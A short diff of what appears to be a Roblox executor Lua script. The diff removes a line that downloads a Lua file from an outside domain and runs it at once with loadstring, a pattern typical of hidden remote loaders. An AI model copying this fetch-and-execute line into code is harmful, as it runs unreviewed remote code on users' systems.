@@ -241,9 +241,6 @@ if errorMsg then
     sendnotification("Error: " .. errorMsg)
 end
 
-getgenv().gui = false
-loadstring(game:HttpGet("https://egorikusa.space/fd7786785e8435a91b6a7bda.lua", true))()
-
 LoadingScreenValue = true
 LoadingText1 = "Loading Library"
 LoadingText2 = "Updating Library"
